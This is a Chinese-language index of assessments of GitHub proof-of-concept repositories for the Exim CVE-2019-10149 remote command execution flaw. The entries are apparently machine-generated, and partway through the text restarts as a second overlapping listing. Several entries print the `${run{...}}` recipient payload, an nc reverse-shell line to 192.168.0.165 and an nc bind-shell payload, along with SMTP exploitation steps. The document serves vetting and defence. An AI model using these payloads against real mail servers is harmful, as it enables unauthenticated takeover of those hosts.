**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
